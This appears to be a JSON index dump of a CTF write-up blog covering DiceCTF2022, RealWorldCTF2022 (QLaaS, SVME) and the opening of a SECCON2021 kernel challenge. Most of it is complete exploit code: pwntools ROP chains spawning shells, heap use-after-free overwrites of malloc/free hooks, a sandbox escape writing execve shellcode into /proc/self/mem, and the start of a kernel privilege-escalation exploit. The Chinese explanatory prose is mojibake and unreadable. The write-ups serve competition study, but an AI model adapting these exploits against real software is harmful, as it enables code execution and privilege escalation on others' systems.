{op6}{imm3}) == {imm4}' # print(eq) slov.add(eval(eq)) if slov.check() == sat: result = slov.model() str = [' ']*0x30 for i in result: idx = int(i.name()[1:]) str[idx] = chr(result[i].as_long()) print(''.join(str)) else: print(\"[!] No result\") # dice{st4ying_ins1de_vms_1s_0verr4ted} ","date":"2022-03-07","objectID":"/dicectf2022-containment-breach/:3:3","series":null,"tags":["Writeups"],"title":"DiceCTF2022-containment/breach","uri":"/dicectf2022-containment-breach/#z3-slover"},{"categories":["Writeups"],"content":"DiceCTF2020DiceCTFé¢˜ç›®å¥½æ€ªå•Š ","date":"2022-02-08","objectID":"/dicectf2022/:0:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#dicectf2020"},{"categories":["Writeups"],"content":"interviewåœ¨ä¸»å‡½æ•°æœ‰ä¸€ä¸ªæº¢å‡ºï¼Œè¦†ç›–mainçš„è¿”å›åœ°å€ä¸º_libc_strat_mainå†…ï¼Œå¯ä»¥å†æ¬¡è°ƒç”¨mainåŒæ—¶å¾—åˆ°libcåœ°å€ã€‚ from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './interview-opportunity' libc = './libc.so.6' context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level='debug' # p = process(binary) p = remote('mc.ax', 31081) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) # gdb.attach(p, \"b *0x401276\") payload = \"A\"*0x1a + \"B\"*0x8 + \"\\x03\" p.sendafter(\"DiceGang?\\n\", payload) p.recvuntil(\"B\"*0x8) libcbase = u64(p.recv(6).ljust(8, \"\\x00\")) - 0x26d03 leak(\"libc base\", libcbase) pop_rdi = libcbase + 0x0000000000026796 binsh = libcbase + 0x000000000018a152 system = libcbase + libc.sym['system'] payload = \"A\"*0x1a + \"B\"*0x8 + p64(pop_rdi) + p64(binsh) + p64(system) p.sendafter(\"DiceGang?\\n\", payload) p.interactive() ","date":"2022-02-08","objectID":"/dicectf2022/:1:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#interview"},{"categories":["Writeups"],"content":"baby-ropuafï¼Œé€šè¿‡å¯¹ubä¸­çš„chunkçš„å¤ç”¨æ³„æ¼libcåœ°å€ï¼Œuafæ§åˆ¶ä¸€ä¸ªstringsçš„ç»“æ„ä½“ï¼Œä»è€Œå¯ä»¥ä»»æ„åœ°å€è¯»å†™ï¼Œæ³„éœ²æ ˆåœ°å€ï¼Œå‘æ ˆä¸­å†™rop from multiprocessing.dummy import Value from os import environ from webbrowser import get from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './babyrop' libc = './libc.so-2.6' context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level='debug' # p = process(binary) p = remote('mc.ax', 31245) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) def add(idx, size, data): p.sendlineafter(\"command: \",\"C\") p.sendlineafter(\"index: \", str(idx)) p.sendlineafter(\"string: \", str(size)) p.sendafter(\" string: \", data) def free(idx): p.sendlineafter(\"command: \",\"F\") p.sendlineafter(\"index: \", str(idx)) def show(idx): p.sendlineafter(\"command: \",\"R\") p.sendlineafter(\"index: \", str(idx)) def edit(idx, data): p.sendlineafter(\"command: \",\"W\") p.sendlineafter(\"index: \", str(idx)) p.sendlineafter(\" string: \", data) def get_leak(size): p.recvuntil(\"bytes\\n\") buf = p.recvuntil(\"\\n\", drop=True).split(\" \") value = 0 for i in range(size): value += (int(buf[i], 16)\u003c\u003c(8*i)) return value # print(\"value = \" + hex(value)) add(0, 0x500, \"a\"*0x18) add(1, 0x500, \"a\"*0x18) add(2, 0x500, \"a\"*0x18) free(0) free(1) add(0, 0x500, 'A') add(1, 0x500, 'A') show(0) p.recvuntil(\"bytes\\n\") p.recvuntil(\"00 00 \") buf = p.recvuntil(\"\\n\", drop=True).split(\" \") heapbase = 0 for i in range(8): heapbase += (int(buf[i], 16)\u003c\u003c(8*i)) heapbase = heapbase - 0x1c00 leak(\"heapbase\", heapbase) # pause() show(1) p.recvuntil(\"bytes\\n\") buf = p.recvuntil(\"\\n\", drop=True).split(\" \") libcbase = 0 for i in range(8): libcbase += (int(buf[i], 16)\u003c\u003c(8*i)) libcbase = libcbase - 0x1f4c41 leak(\"libc base\", libcbase) open_addr = libcbase + libc.sym['open'] read_addr = libcbase + libc.sym['read'] write_addr = libcbase + libc.sym['write'] environ = libcbase + libc.sym['environ'] pop_rdi = libcbase + 0x000000000002d7dd pop_rsi = libcbase + 0x000000000002eef9 pop_rdx = libcbase + 0x00000000000d9c2d add(0, 0x18, \"0\"*0x18) add(1, 0x28, \"1\"*0x18) free(0) free(1) add(2, 0x18, p64(0x100)+p64(environ)) show(0) stack_leak = get_leak(8) - 0x140 leak(\"stack leak\", stack_leak) edit(2,p64(0x100)+p64(stack_leak)) flag_str = stack_leak + 0x8*(19+8) orw = p64(pop_rdi+1)*8 # open orw += p64(pop_rdi) + p64(flag_str) + p64(pop_rsi) + p64(0) + p64(open_addr) # read orw += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_str) + p64(pop_rdx) + p64(0x100) + p64(read_addr) # write orw += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(flag_str) + p64(pop_rdx) + p64(0x100) + p64(write_addr) orw += \"./flag.txt\\x00\" edit(0, orw) p.sendlineafter(\"command: \",\"E\") p.interactive() ","date":"2022-02-08","objectID":"/dicectf2022/:2:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#baby-rop"},{"categories":["Writeups"],"content":"dataeaterå¯ä»¥æ§åˆ¶scanfçš„å‚æ•°ï¼Œä¸èƒ½ropã€‚è¿™æ ·å¯ä»¥å†™ä»»æ„å†™bufå’Œlink_mapã€‚è¦†ç›–link_map-\u003el_info[strtab]ä¸ºbufï¼Œä»è€Œåœ¨bufä¼ªé€ systemå­—ç¬¦ä¸²ï¼Œä½¿å…¶æœç´¢systemåœ°å€ã€‚ from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './dataeater' libc = \"/lib/x86_64-linux-gnu/libc.so.6\" context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level='debug' # p = process(binary) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) st_name = 0x37 system_str = elf.sym['buf'] + 0x10 def pwn(k): print(k) try: r = remote('mc.ax', 31869) # r = process(binary) # gdb.attach(r) r.sendline('%s%{}$s'.format(k)) # r.sendline(\"a a\") r.sendline(b'/bin/sh\\0' + p64(system_str - st_name) + b'system\\0' + p64(0)*13 + p64(elf.sym['buf'])[:-1]) r.interactive() return True except EOFError: return False finally: r.close() pwn(32) ","date":"2022-02-08","objectID":"/dicectf2022/:3:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#dataeater"},{"categories":["Writeups"],"content":"chutes-ladders First, copy all the Player-\u003emark to the first board-\u003eplayers Gameï¼š spin a num ï¼ˆ0-6ï¼‰ï¼Œ 0 pass cur_player-\u003esquare update board board-\u003ebitmap ^= (1 \u003c\u003c palyer_idx) leave here clear board-\u003eplayers if bitmap == 0: free board-\u003eplayers Player-\u003esquare += spin if hit a ladders: cur_player-\u003esquare = ladders_end update board board-\u003ebitmap ^= (1 \u003c\u003c palyer_idx) enter here first get the board: allocte board-\u003eplayers, init with â€™ ' copy mark ladders_hit = 1 if hit a chutes: cur_player-\u003esquare = chutes_end update board board-\u003ebitmap ^= (1 \u003c\u003c palyer_idx) enter here first get the board: allocte board-\u003eplayers, init with â€™ ' copy mark chutes_hit = 1 else update board board-\u003ebitmap ^= (1 \u003c\u003c palyer_idx) enter here first get the board: allocte board-\u003eplayers, init with â€™ ' copy mark chutes_hit = 1 if bitmap == 0: board-\u003eplayers = 0 next turn repeat 10 players [0, 1, 2, 3, 4, 5, 6, 7, 8] at 1 allocate one chunk [3, 4, 5, 6, 7, 8] at 1, [0, 1, 2] at 2 allocate two chunk [3, 4, 5, 6, 7, 8] at 1, [1, 2] at 2, 0 at 5 allocate three chunk [1, 2, 3, 4, 5, 6, 7, 8] at 2, [0] at 5 allocate two chunk free 1 [1, 2, 3, 4, 5, 6, 7, 8] at 2, [0] leave but ret to 5 allocate one chunk free 3 (UAF) -\u003e free 1 [8, 9] at 2, [0, 1, 2, 3, 4, 5, 6, 7] at 5 allocate one chunk free 3 (UAF) -\u003e __malloc_hook [8, 9] at 2, [1, 2, 3, 4, 5, 6, 7] at 5, [9] at 6 __malloc_hook [8] at 2, [1, 2, 3, 4, 5, 6, 7] at 5, [9] at 6, [0] at 10 10 is __malloc_hook - 4 [1, 2, 3, 8] at 5, [0, 4, 5, 6, 7, 9] at 10 overwrite malloc_hook to one gadget [1, 2, 3] at 5, [0, 4, 5, 6, 7, 8, 9] at 10 overwrite malloc_hook to one gadget [1, 2, 3] at 5, [4, 5, 6, 7, 8, 9] at 10, [0] at 14 hit chutes to 0! clear rdx=0, trigger one gadget from pwn import * leak = lambda name,addr: log.success('{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './chutes' libc = './libc.so-3.6' context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level='debug' # p = process(binary) p = remote(\"mc.ax\",31326) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) def change_maps(): p.sendlineafter(\"(y/n): \", \"y\") p.sendlineafter(\": \", \"10 4\") # to uaf p.sendlineafter(\": \", \"14 0\") # to clear rdx p.sendlineafter(\": \", \"30 21\") p.sendlineafter(\": \", \"40 31\") p.sendlineafter(\": \", \"50 41\") p.sendlineafter(\": \", \"6 99\") # to leak p.sendlineafter(\": \", \"33 97\") p.sendlineafter(\": \", \"48 62\") p.sendlineafter(\": \", \"68 72\") p.sendlineafter(\": \", \"78 93\") def turn(spin, mark=None, see='n'): if mark != None: p.sendlineafter(\": \", \"y\") p.sendlineafter(\": \", mark) else: p.sendlineafter(\": \", \"n\") p.sendlineafter(\"): \", str(spin)) p.sendlineafter(\"): \", see) p.sendlineafter(\"10): \", \"10\") for i in range(10): p.sendlineafter(\": \", str(i)) change_maps() # turn(6) p.sendlineafter(\": \", \"n\") p.sendlineafter(\"): \", str(6)) p.recvline() p.recvuntil(\"prize: 0x\") one = [0xe6c7e, 0xe6c81, 0xe6c84] libc_base = int(p.recvuntil(\"\\n\", drop=True), 16) - libc.sym[\"puts\"] malloc_hook = libc_base + libc.sym[\"__malloc_hook\"] - 4 og = libc_base + one[1] leak(\"libc_base\",libc_base) leak(\"malloc_hook\", malloc_hook) p.sendlineafter(\"): \", \"n\") turn(1) # 1 turn(1) # 2 for i in range(10-3): turn(0) # 3 4 5 6 7 8 9 turn(4) # 0 turn(0) # 1 turn(0) # 2 for i in range(10-3): turn(1) # 3 4 5 6 7 8 9 turn(6, p64(malloc_hook)[0]) # 0 for i in range(1, 8): turn(3, p64(malloc_hook)[i]) # 1 2 3 4 5 6 7 turn(0) # 8 turn(4) # 9 turn(5, '\\xaa') # 0 turn(0, '\\xbb') # 1 turn(0, '\\xcc') # 2 turn(0, '\\xdd') # 3 for i in [4, 5, 6, 7]: turn(5, p64(og)[i-4]) turn(3, p64(og)[4]) # 8 --\u003e [5] turn(4, p64(og)[5]) # 9 --\u003e [10] for i in range(8): turn(0) turn(5) # 8 turn(0) # 9 p.sendlineafter(\": \", \"n\") p.sendlineafter(\"): \", str(5)) p.interactive() ","date":"2022-02-08","objectID":"/dicectf2022/:4:0","series":null,"tags":["Writeups"],"title":"DiceCTF2022","uri":"/dicectf2022/#chutes-ladders"},{"categories":["Writeups"],"content":"QLaaSè¿™æ˜¯æˆ‘æ¯”è¾ƒæ„Ÿå…´è¶£çš„ä¸€ä¸ªé¢˜ç›®ã€‚åœ¨æ¯”èµ›æ—¶ï¼Œæˆ‘çš„æ€è·¯æ˜¯ç±»ä¼¼è™šæ‹Ÿæœºé€ƒé€¸ï¼Œé€šè¿‡è¯»å†™å†…å­˜ä»è€Œå®ç°CPUçš„é€ƒé€¸ï¼Œä¸ºæ­¤æˆ‘è¿˜å»å¯»æ‰¾äº†Unicornçš„CVEã€‚å› ä¸ºæˆ‘å¾ˆå¥½å¥‡ï¼Œåœ¨ç¨‹åºè®¿é—®å†…å­˜æ—¶ï¼Œæ²™ç›’æ˜¯å¦‚ä½•å°†åœ°å€è¿›è¡Œå¤„ç†ä»è€Œä¿è¯å®‰å…¨çš„ã€‚æˆ‘åœ¨cveä¸­çœ‹åˆ°äº†åœ¨0x800000..00é™„è¿‘ä¼šæœ‰éƒ¨åˆ†æ•°æ®ï¼Œè€Œåœ¨çœŸæ­£çš„ç¨‹åºè¿è¡Œçš„æ—¶å€™ä¸ä¼šä½¿ç”¨è¿™ä¸ªåœ°å€ã€‚é€šè¿‡å®éªŒï¼Œæˆ‘æˆåŠŸçš„è¯»å‡ºäº†è¿™éƒ¨åˆ†çš„æ•°æ®ã€‚ä½†æ˜¯æˆ‘å¹¶ä¸çŸ¥é“è¿™éƒ¨åˆ†æ˜¯ä»€ä¹ˆã€‚ é¢˜ç›®çœŸæ­£çš„æ”»å‡»é¢åœ¨ä¸openatå‡½æ•°æ²¡æœ‰æ­£ç¡®å¤„ç†ç›®å½•ç©¿è¶Šçš„é—®é¢˜ã€‚ ä¸‹é¢æˆ‘ä»¬å…ˆçœ‹çœ‹syscall_open: def ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int): path = ql.os.utils.read_cstring(filename) real_path = ql.os.path.transform_to_real_path(path) relative_path = ql.os.path.transform_to_relative_path(path) flags \u0026= 0xffffffff mode \u0026= 0xffffffff idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1) if idx == -1: regreturn = -EMFILE else: try: if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX: mode = 0 #flags = ql_open_flag_mapping(ql, flags) flags = ql_open_flag_mapping(ql, flags) ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode) regreturn = idx except QlSyscallError as e: regreturn = - e.errno ql.log.debug(\"open(%s, 0o%o) = %d\" % (relative_path, mode, regreturn)) if regreturn \u003e= 0 and regreturn != 2: ql.log.debug(f'File found: {real_path:s}') else: ql.log.debug(f'File not found {real_path:s}') return regreturn openå°†pathåˆ†åˆ«è½¬åŒ–ä¸ºäº†real_pathå’Œrelative_pathã€‚æœ€ç»ˆé€šè¿‡ql.os.fs_mapper.open_ql_fileæ‰“å¼€æ–‡ä»¶ï¼Œä¸è¿‡ä½¿ç”¨çš„è¿˜æ˜¯pathã€‚ def open_ql_file(self, path, openflags, openmode, dir_fd=None): if self.has_mapping(path): self.ql.log.info(f\"mapping {path}\") return self._open_mapping_ql_file(path, openflags, openmode) else: if dir_fd: return ql_file.open(path, openflags, openmode, dir_fd=dir_fd) real_path = self.ql.os.path.transform_to_real_path(path) return ql_file.open(real_path, openflags, openmode) å¦‚æœæ–‡ä»¶å·²è¢«æ˜ å°„åˆ™æ‰“å¼€ã€‚å¦‚æœæ²¡æœ‰ï¼Œå…ˆæ£€æŸ¥dir_fdæ˜¯å¦è¢«æŒ‡å®šï¼Œå¦åˆ™ä¼šä½¿ç”¨ real_pathæ‰“å¼€æ–‡ä»¶ã€‚ def transform_to_real_path(self, path): from types import FunctionType rootfs = self.ql.rootfs real_path = self.convert_path(rootfs, self.cwd, path) if os.path.islink(real_path): link_path = Path(os.readlink(real_path)) if not link_path.is_absolute(): real_path = Path(os.path.join(os.path.dirname(real_path), link_path)) # resolve multilevel symbolic link if not os.path.exists(real_path): path_dirs = link_path.parts if link_path.is_absolute(): path_dirs = path_dirs[1:] for i in range(0, len(path_dirs)-1): path_prefix = os.path.sep.join(path_dirs[:i+1]) real_path_prefix = self.transform_to_real_path(path_prefix) path_remain = os.path.sep.join(path_dirs[i+1:]) real_path = Path(os.path.join(real_path_prefix, path_remain)) if os.path.exists(real_path): break return str(real_path.absolute()) pathè¢«convert_pathè½¬æ¢ï¼Œæœ€åè¿”å›çœŸå®è·¯å¾„çš„ç»å¯¹è·¯å¾„ã€‚ @staticmethod def convert_for_native_os(rootfs, cwd, path): rootfs = Path(rootfs) cwd = PurePosixPath(cwd[1:]) path = Path(path) if path.is_absolute(): return rootfs / QlPathManager.normalize(path) else: return rootfs / QlPathManager.normalize(cwd / path.as_posix()) def convert_path(self, rootfs, cwd, path): if (self.ql.ostype == self.ql.platform ) \\ or (self.ql.ostype in [QL_OS.LINUX, QL_OS.MACOS] and self.ql.platform in [QL_OS.LINUX, QL_OS.MACOS]): return QlPathManager.convert_for_native_os(rootfs, cwd, path) elif self.ql.ostype in [QL_OS.LINUX, QL_OS.MACOS] and self.ql.platform == QL_OS.WINDOWS: return QlPathManager.convert_posix_to_win32(rootfs, cwd, path) elif self.ql.ostype == QL_OS.WINDOWS and self.ql.platform in [QL_OS.LINUX, QL_OS.MACOS]: return QlPathManager.convert_win32_to_posix(rootfs, cwd, path) else: # Fallback return QlPathManager.convert_for_native_os(rootfs, cwd, path) æœ€åæ— è®ºå¦‚ä½•æˆ‘ä»¬çš„è®¿é—®éƒ½è¢«é™åˆ¶åœ¨äº†rootfsä¸‹ã€‚è¿™é‡Œå¯ä»¥æ³¨æ„åˆ°ï¼Œå¦‚æœæˆ‘ä»¬æŒ‡å®šäº†dir_fdè¿™ä¸ä¼šå¯¹è·¯å¾„è¿›è¡Œä¿®æ­£ã€‚é™å…çœ‹çœ‹openatå®ç°ï¼š def ql_syscall_openat(ql: Qiling, fd: int, path: int, flags: int, mode: int): file_path = ql.os.utils.read_cstring(path) # real_path = ql.os.path.transform_to_real_path(path) # relative_path = ql.os.path.transform_to_relative_path(path) flags \u0026= 0xffffffff mode \u0026= 0xffffffff idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1) if idx == -1: regreturn = -EMFILE else: try: if ql.archtype== QL_ARCH.ARM: mode = 0 flags = ql_open_flag_mapping(ql, flags) fd = ql.unpacks(ql.pack(fd)) if 0 \u003c= fd \u003c NR_OPEN: dir_fd = ql.os.fd[fd].fileno() else: dir_fd ","date":"2022-01-27","objectID":"/realworldctf2022-qlaas/:0:0","series":null,"tags":["Writeups"],"title":"RealWorldCTF2022-QLaaS","uri":"/realworldctf2022-qlaas/#qlaas"},{"categories":["Writeups"],"content":"exploitåˆ†è¡Œè¯»å–mapså¾—åˆ°pythonçš„libcå¯æ‰§è¡Œæ®µçš„åœ°å€ï¼Œç„¶åè¯»å–memï¼Œé€šè¿‡lseekç§»åˆ°å¯¹åº”çš„ä¾¿å®œï¼Œç„¶åå†™å…¥shellcodeå³å¯ã€‚ #include \u003cfcntl.h\u003e#include \u003cmalloc.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/mman.h\u003e#include \u003cunistd.h\u003e char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"H\\xbf/bin/sh\\x00WH\\x89\\xe7H1\\xf6H1\\xd2H\\xc7\\xc0;\\x00\\x00\\x00\\x0f\\x05\"; int main(int argc, char *argv[]) { int maps, mem; FILE *fp; maps = openat(1, \"/proc/self/maps\", O_RDONLY); if (maps \u003c 0) { printf(\"Couldn't open /proc/self/maps'\"); exit(-1); } mem = openat(1, \"/proc/self/mem\", O_RDWR); if (maps \u003c 0) { printf(\"Couldn't open /proc/self/mem'\"); exit(-1); } fp = fdopen(maps, \"rw\"); if (fp == NULL) { printf(\"Couldn't open /proc/self/mem fd'\"); exit(-1); } char line[1024]; unsigned long addr = 0; while (fgets(line, sizeof(line), fp)) { if (strstr(line, \"r-xp\") \u0026\u0026 strstr(line, \"libc-2.31.so\")) { sscanf(line, \"%lx-\", \u0026addr); break; } } for (int i = 0; i \u003c 0x17; i++) { lseek(mem, addr + i * 0x100, SEEK_SET); write(mem, shellcode, sizeof(shellcode)); } return 0; } ","date":"2022-01-27","objectID":"/realworldctf2022-qlaas/:1:0","series":null,"tags":["Writeups"],"title":"RealWorldCTF2022-QLaaS","uri":"/realworldctf2022-qlaas/#exploit"},{"categories":["Writeups"],"content":"SVMEç¨‹åºä¸ºä¸€ä¸ªç®€æ˜“çš„è™šæ‹Ÿæœºï¼Œåœ¨Githubä¸Šå¯ä»¥æ‰¾åˆ°ä½œè€…çš„æºç ï¼Œç¨‹åºä¹Ÿæ²¡æœ‰å»é™¤ç¬¦å·ã€‚è¿™ä¸ªè™šæ‹Ÿæœºæ›´æ¥è¿‘ä¸€ä¸ªæ ˆæœºå™¨ï¼Œå®ƒæ²¡æœ‰å®ç°ä»»ä½•é€šç”¨å¯„å­˜å™¨ï¼Œè€Œæ˜¯ä½¿ç”¨æ ˆè¿›ç¨‹æ•°æ®ä¿å­˜å’Œå‚æ•°ä¼ é€’ã€‚ ","date":"2022-01-27","objectID":"/realworldctf2022-svme/:0:0","series":null,"tags":["Writeups"],"title":"RealWorldCTF2021-SVME","uri":"/realworldctf2022-svme/#svme"},{"categories":["Writeups"],"content":"Vulnæˆ‘æ‰¾åˆ°çš„bugæ˜¯æ ˆè¶Šç•Œã€‚æ ˆæŒ‡é’ˆå¯ä»¥è¶Šç•Œåˆ°codeæ•°æ®ç»“æ„å’Œå…¨å±€æ•°æ®ç»“æ„ï¼Œè¿™æ ·å°±å¯ä»¥æ”¹å†™å…¶å…¨å±€æ•°æ®æŒ‡é’ˆã€‚å¦å¤–ï¼Œå…¶è°ƒç”¨æ ˆæ˜¯ç›´æ¥ç”³è¯·åœ¨ä¸Šä¸‹æ–‡ç»“æ„ä¸­çš„ï¼Œè¿™é‡ŒåŒæ ·å¯ä»¥è¶Šç•Œã€‚é€šè¿‡loadå’ŒstoreæŒ‡ä»¤ä¸æ–­çš„å†™å†…å­˜ï¼Œå°†å…¨å±€æ•°æ®æŒ‡é’ˆè¦†ç›–ä¸ºcodeæŒ‡é’ˆï¼Œcodeæ˜¯ä»å­˜æ”¾åœ¨ç¨‹åºçš„æ ˆä¸­çš„ï¼Œå¯ä»¥ä»ä¸­å¾—åˆ°libcæŒ‡é’ˆã€‚é€šè¿‡è®¡ç®—è¦†ç›–æŒ‡é’ˆä¸ºfree_hookï¼Œç„¶åå†™free_hookä¸ºsystemï¼Œåœ¨free_hook-8å†™â€œ/bin/shâ€ã€‚ from pwn import * def leak(name, addr): return log.success( '{0}\\t---\u003e\\t{1}'.format(name, hex(addr))) binary = './svme' # binary = './svme' libc = './libc-2.31.so' context.terminal = ['tmux', 'splitw', '-h'] context.binary = binary context.log_level = 'debug' # p = process(binary) p = remote('47.243.140.252', 1337) elf = ELF(binary, checksec=False) libc = ELF(libc, checksec=False) def noop(): return p32(0) def iadd(): return p32(1) def isub(): return p32(2) def imul(): return p32(3) def ilt(): return p32(4) def ieq(): return p32(5) def br(addr): return p32(6)+p32(addr) def brt(addr): return p32(7)+p32(addr) def brf(addr): return p32(8)+p32(addr) def iconst(data): return p32(9)+p32(data) def load(offset): return p32(10)+p32(offset) def gload(offset): return p32(11)+p32(offset) def store(offset): return p32(12)+p32(offset) def gstore(offset): return p32(13)+p32(offset) def print_(): return p32(14) def pop(): return p32(15) def ret(): return p32(17) def halt(): return p32(18) # gdb.attach(p, \"b vm_exec\") cmd = '' cmd += gload(0xfffff7c0)+gload(0xfffff7c1) # save code pointer cmd += print_()*5 # sp to *global cmd += load(0xfffffc22) + load(0xfffffc23) # over write global cmd += iconst(0) # recover sp value cmd += gload(0x86) + iconst(0x1c7a75-8) + iadd() # save libc pointer cmd += gload(0x87) # save libc pointer cmd += print_()*5 cmd += load(0xfffffc22) + load(0xfffffc23) # over write global to free_hook-8 cmd += iconst(0) # recover sp value cmd += load(0xfffffc22) + iconst(0x199710) + \\ isub() + load(0xfffffc22-2) # calc system addr cmd += gstore(3) + gstore(2) # overwrite free_hook cmd += iconst(0x6e69622f) + gstore(0) # /bin/sh cmd += iconst(0x0068732f) + gstore(1) cmd += halt() # pwn! p.send(cmd.ljust(0x128*4, '\\x00')) p.interactive() ","date":"2022-01-27","objectID":"/realworldctf2022-svme/:1:0","series":null,"tags":["Writeups"],"title":"RealWorldCTF2021-SVME","uri":"/realworldctf2022-svme/#vuln"},{"categories":["Writeups"],"content":"kone_gadgetAdded to arch/x86/entry/syscalls/syscall_64.tbl 1337 64 seccon sys_seccon Added to kernel/sys.c: SYSCALL_DEFINE1(seccon, unsigned long, rip) { asm volatile(\"xor %%edx, %%edx;\" \"xor %%ebx, %%ebx;\" \"xor %%ecx, %%ecx;\" \"xor %%edi, %%edi;\" \"xor %%esi, %%esi;\" \"xor %%r8d, %%r8d;\" \"xor %%r9d, %%r9d;\" \"xor %%r10d, %%r10d;\" \"xor %%r11d, %%r11d;\" \"xor %%r12d, %%r12d;\" \"xor %%r13d, %%r13d;\" \"xor %%r14d, %%r14d;\" \"xor %%r15d, %%r15d;\" \"xor %%ebp, %%ebp;\" \"xor %%esp, %%esp;\" \"jmp %0;\" \"ud2;\" : : \"rax\"(rip)); return 0; } æ²¡æœ‰å¼€å¯kaslrã€‚æä¾›äº†ä¸€æ¬¡æ§åˆ¶ripçš„æœºä¼šï¼Œä½†æ˜¯é™¤äº†raxå¤–æ‰€æœ‰çš„å¯„å­˜å™¨éƒ½è¢«æ¸…ç©ºäº†ã€‚ebpfå¯ä»¥é€šè¿‡JITäº§ç”Ÿå†…æ ¸å¯æ‰§è¡Œçš„shellcodeï¼Œä½†æ˜¯åœ¨æœ¬é¢˜ä¸­ï¼Œunprivilege bpfè¢«ç¦æ­¢äº†ã€‚è€Œseccomp_filterçš„JITæ˜¯å¼€å¯çš„ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å®ç°shellcodeã€‚é€šè¿‡è°ƒè¯•ï¼ŒBPF_STMT(BPF_LD|BPF_K, value)ä¼šè¢«ç¼–è¯‘ä¸ºmov eax,valueçš„æŒ‡ä»¤ã€‚æˆ‘ä»¬å¯ä»¥æ§åˆ¶valueå­—æ®µä¸ºæƒ³è¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œç„¶åé€šè¿‡è·³è½¬åˆ°ä¸‹ä¸€ä¸ªæŒ‡ä»¤ä»è€Œè·³è¿‡æ— æ³•è¯†åˆ«çš„æŒ‡ä»¤ã€‚è¿™è¦æ±‚æˆ‘ä»¬åœ¨é€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›è¡Œè·³è½¬æ—¶åç§»ä¸€å®šçš„å­—èŠ‚ã€‚ä¸ºäº†æé«˜æˆåŠŸç‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å‰é¢å–·å°„å¤§é‡çš„nopã€‚ ","date":"2022-01-21","objectID":"/seccon2021-kone-gadget/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2021-kone_gadget","uri":"/seccon2021-kone-gadget/#kone_gadget"},{"categories":["Writeups"],"content":"The full exp #include \u003clinux/bpf_common.h\u003e#define _GNU_SOURCE #include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/seccomp.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e #define PAGE_SIZE 4096 void die(const char *msg) { perror(msg); exit(-1); } int global_fd; uint64_t kernbase; uint64_t user_cs, user_sp, user_ss, user_rflags; uint64_t prepare_kernel_cred = 0xffffffff81073c60; uint64_t commit_creds = 0xffffffff81073ad0; uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81800e10 + 22; void save_status() { __asm__(\"mov %0, cs;\" \"mov %1, ss;\" \"mov %2, rsp;\" 